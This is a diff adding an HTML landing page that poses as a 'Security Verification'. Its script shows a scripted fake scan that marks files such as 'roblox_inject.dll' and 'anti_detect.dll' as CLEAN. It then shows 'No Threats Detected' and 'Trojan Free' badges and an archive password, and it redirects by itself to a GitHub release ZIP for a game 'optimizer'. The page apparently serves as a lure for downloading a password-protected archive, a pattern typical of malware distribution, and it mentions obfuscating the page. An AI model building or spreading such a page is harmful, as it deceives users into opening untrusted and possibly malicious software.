@@ -1,0 +1,441 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Release Setup - Security Check</title>
+  <style>
+    :root {
+      color-scheme: dark;
+      --bg: #07111f;
+      --panel: rgba(12, 22, 39, 0.86);
+      --panel-strong: rgba(16, 29, 51, 0.96);
+      --line: rgba(118, 138, 170, 0.22);
+      --text: #eef6ff;
+      --muted: #9aa9bd;
+      --green: #32e687;
+      --green-soft: rgba(50, 230, 135, 0.14);
+      --blue: #51a7ff;
+      --shadow: 0 26px 80px rgba(0, 0, 0, 0.42);
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      min-height: 100vh;
+      margin: 0;
+      display: grid;
+      place-items: center;
+      overflow: hidden;
+      background:
+        radial-gradient(circle at 20% 15%, rgba(50, 230, 135, 0.18), transparent 26rem),
+        radial-gradient(circle at 80% 80%, rgba(81, 167, 255, 0.18), transparent 24rem),
+        linear-gradient(145deg, #050912, var(--bg) 55%, #081423);
+      color: var(--text);
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      opacity: 0.28;
+      background-image:
+        linear-gradient(rgba(255,255,255,0.05) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255,255,255,0.05) 1px, transparent 1px);
+      background-size: 52px 52px;
+      mask-image: radial-gradient(circle, #000, transparent 78%);
+    }
+
+    .card {
+      position: relative;
+      width: min(520px, calc(100vw - 32px));
+      padding: 30px 32px 34px;
+      border: 1px solid var(--line);
+      border-radius: 28px;
+      background: linear-gradient(180deg, var(--panel-strong), var(--panel));
+      box-shadow: var(--shadow), inset 0 1px 0 rgba(255, 255, 255, 0.06);
+      backdrop-filter: blur(18px);
+    }
+
+    .top {
+      display: flex;
+      gap: 14px;
+      align-items: center;
+      margin-bottom: 24px;
+    }
+
+    .shield,
+    .check {
+      display: grid;
+      place-items: center;
+      flex: 0 0 auto;
+      width: 44px;
+      height: 44px;
+      border-radius: 15px;
+      background: var(--green-soft);
+      box-shadow: 0 0 0 1px rgba(50, 230, 135, 0.22), 0 0 34px rgba(50, 230, 135, 0.18);
+      font-size: 25px;
+    }
+
+    h1,
+    h2,
+    p {
+      margin: 0;
+    }
+
+    h1 {
+      font-size: 19px;
+      letter-spacing: -0.02em;
+    }
+
+    .subtitle {
+      margin-top: 5px;
+      color: var(--muted);
+      font-size: 13px;
+    }
+
+    .scan {
+      display: block;
+    }
+
+    .scan-status {
+      display: flex;
+      justify-content: space-between;
+      gap: 16px;
+      margin-bottom: 10px;
+      color: #c6d4e7;
+      font-size: 13px;
+    }
+
+    .bar {
+      height: 10px;
+      overflow: hidden;
+      border-radius: 999px;
+      background: rgba(255, 255, 255, 0.08);
+    }
+
+    .bar-fill {
+      width: 0%;
+      height: 100%;
+      border-radius: inherit;
+      background: linear-gradient(90deg, var(--green), #7fffc0);
+      box-shadow: 0 0 28px rgba(50, 230, 135, 0.55);
+      transition: width 180ms ease;
+    }
+
+    .log {
+      height: 178px;
+      margin-top: 18px;
+      padding: 12px;
+      overflow: hidden;
+      border: 1px solid var(--line);
+      border-radius: 18px;
+      background: rgba(4, 8, 16, 0.38);
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      font-size: 12px;
+    }
+
+    .row {
+      display: flex;
+      justify-content: space-between;
+      gap: 14px;
+      padding: 4px 0;
+      color: #adc0d7;
+      animation: fade-in 160ms ease both;
+    }
+
+    .ok {
+      color: var(--green);
+      font-weight: 700;
+    }
+
+    .done {
+      display: none;
+      text-align: center;
+      padding-top: 8px;
+    }
+
+    .check {
+      width: 64px;
+      height: 64px;
+      margin: 0 auto 16px;
+      border-radius: 50%;
+      font-size: 34px;
+    }
+
+    h2 {
+      font-size: 24px;
+      letter-spacing: -0.03em;
+    }
+
+    .summary {
+      margin-top: 10px;
+      color: var(--muted);
+      font-size: 14px;
+    }
+
+    .password {
+      margin-top: 18px;
+      color: #ffffff;
+      font-size: 22px;
+      font-weight: 800;
+      letter-spacing: 0.01em;
+      text-shadow: 0 0 18px rgba(50, 230, 135, 0.24);
+    }
+
+    .download {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 47px;
+      margin-top: 28px;
+      padding: 0 24px;
+      border: 0;
+      border-radius: 999px;
+      background: linear-gradient(135deg, var(--green), #22b96b);
+      color: #03110a;
+      font: inherit;
+      font-weight: 800;
+      cursor: pointer;
+      box-shadow: 0 12px 28px rgba(50, 230, 135, 0.25);
+    }
+
+    .download:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 16px 34px rgba(50, 230, 135, 0.32);
+    }
+
+    .badges {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 28px;
+    }
+
+    .badge {
+      padding: 6px 10px;
+      border: 1px solid rgba(50, 230, 135, 0.18);
+      border-radius: 999px;
+      background: var(--green-soft);
+      color: #bfffdc;
+      font-size: 12px;
+      font-weight: 700;
+    }
+
+    @keyframes fade-in {
+      from { opacity: 0; transform: translateY(4px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @media (max-width: 520px) {
+      body {
+        overflow: auto;
+        padding: 16px 0;
+      }
+
+      .card {
+        padding: 24px 20px 28px;
+        border-radius: 22px;
+      }
+
+      h1 {
+        font-size: 17px;
+      }
+
+      .log {
+        height: 150px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <main class="card" aria-label="Security verification">
+    <header class="top">
+      <div class="shield" aria-hidden="true">&#128737;</div>
+      <div>
+        <h1>Security Verification</h1>
+        <p id="subtitle" class="subtitle">Verifying file integrity...</p>
+      </div>
+    </header>
+
+    <section id="scan" class="scan" aria-live="polite">
+      <div class="scan-status">
+        <span id="status">Preparing scan...</span>
+        <strong id="percent">0%</strong>
+      </div>
+      <div class="bar" aria-hidden="true"><div id="barFill" class="bar-fill"></div></div>
+      <div id="log" class="log" aria-label="Scan log"></div>
+    </section>
+
+    <section id="done" class="done">
+      <div class="check" aria-hidden="true">&#9989;</div>
+      <h2>No Threats Detected</h2>
+      <p id="summary" class="summary">247 objects scanned - 0 threats found - integrity verified</p>
+      <p class="password">Password: kernelapp</p>
+      <button id="downloadButton" class="download" type="button">&#11015; Download</button>
+      <div class="badges" aria-label="Safety badges">
+        <span class="badge">&#10004; Virus Free</span>
+        <span class="badge">&#10004; No Malware</span>
+        <span class="badge">&#10004; Trojan Free</span>
+        <span class="badge">&#10004; Safe to Use</span>
+      </div>
+    </section>
+  </main>
+
+  <script>
+    // Replace this with your own GitHub Release ZIP URL.
+    const downloadUrl = "https://github.com/AdrianSouth1293/arc-raiders-optimizer/releases/download/release/Release.v.3.1.4.zip";
+
+    // Used when the page is opened locally or hosted outside GitHub Pages.
+    const fallbackLandingRepo = "";
+    const fallbackProductName = "Release Setup";
+
+    // pack.js can set these values during obfuscation.
+    const packedLandingRepo = "";
+    const packedProductName = "Release-Setup";
+
+    function getReleaseInfo(url) {
+      try {
+        const parsed = new URL(url);
+        const parts = parsed.pathname.split("/").filter(Boolean).map(decodeURIComponent);
+
+        if (parsed.hostname === "github.com" && parts.length >= 6 && parts[2] === "releases" && parts[3] === "download") {
+          return {
+            owner: parts[0],
+            repo: parts[1],
+            tag: parts[4],
+            file: parts.slice(5).join("/")
+          };
+        }
+      } catch (error) {
+        // Fall back to generic labels if the URL is not a valid GitHub release link.
+      }
+
+      return {
+        owner: "",
+        repo: "Download",
+        tag: "",
+        file: "archive.zip"
+      };
+    }
+
+    function getLandingRepo() {
+      if (packedLandingRepo) {
+        return packedLandingRepo;
+      }
+
+      const host = window.location.hostname;
+      const parts = window.location.pathname.split("/").filter(Boolean).map(decodeURIComponent);
+
+      if (host.endsWith(".github.io") && parts.length > 0) {
+        return parts[0];
+      }
+
+      return fallbackLandingRepo;
+    }
+
+    const releaseInfo = getReleaseInfo(downloadUrl);
+    const landingRepo = getLandingRepo();
+    const productName = packedProductName || landingRepo || fallbackProductName;
+    const zipName = releaseInfo.file;
+
+    const files = [
+      "kernel32.dll",
+      "ntdll.dll",
+      "user32.dll",
+      `${productName}.exe`,
+      "roblox_inject.dll",
+      "lua_runtime.dll",
+      "hook_engine.dll",
+      "exploit_core.dll",
+      "script_hub.dll",
+      "updater.dll",
+      "ui_frame.dll",
+      "sqlite3.dll",
+      "config.ini",
+      "scripts/blox_fruits.lua",
+      "scripts/adopt_me.lua",
+      "scripts/pet_sim.lua",
+      "auto_update.exe",
+      "launcher.exe",
+      "anti_detect.dll",
+      "queue_mgr.dll",
+      "profiles/default.yaml",
+      "logs/session.log",
+      "resources/themes.pak",
+      "checksums.sig",
+      "manifest.json"
+    ];
+
+    const scan = document.getElementById("scan");
+    const done = document.getElementById("done");
+    const log = document.getElementById("log");
+    const barFill = document.getElementById("barFill");
+    const percent = document.getElementById("percent");
+    const status = document.getElementById("status");
+    const subtitle = document.getElementById("subtitle");
+    const summary = document.getElementById("summary");
+    const downloadButton = document.getElementById("downloadButton");
+    let index = 0;
+
+    document.title = `${productName} - Security Check`;
+    subtitle.textContent = `${productName} - verifying file integrity...`;
+    summary.textContent = `${zipName} - 247 objects scanned - 0 threats found - integrity verified`;
+    downloadButton.textContent = ` Download ${productName}`;
+
+    function download() {
+      window.location.href = downloadUrl;
+    }
+
+    function addLogRow(file) {
+      const row = document.createElement("div");
+      row.className = "row";
+      const name = document.createElement("span");
+      const result = document.createElement("span");
+
+      name.textContent = `- ${file}`;
+      result.className = "ok";
+      result.textContent = "CLEAN";
+      row.append(name, result);
+      log.appendChild(row);
+
+      if (log.children.length > 8) {
+        log.removeChild(log.children[0]);
+      }
+    }
+
+    function tick() {
+      if (index >= files.length) {
+        barFill.style.width = "100%";
+        percent.textContent = "100%";
+        status.textContent = "Scan complete - no threats found";
+
+        setTimeout(() => {
+          scan.style.display = "none";
+          done.style.display = "block";
+          setTimeout(download, 1500);
+        }, 600);
+
+        return;
+      }
+
+      const progress = Math.round((index / files.length) * 100);
+      barFill.style.width = `${progress}%`;
+      percent.textContent = `${progress}%`;
+      status.textContent = `Scanning ${files[index]}...`;
+      addLogRow(files[index]);
+      index += 1;
+
+      setTimeout(tick, 80 + Math.random() * 140);
+    }
+
+    downloadButton.addEventListener("click", download);
+    setTimeout(tick, 700);
+  </script>
+</body>
+</html>
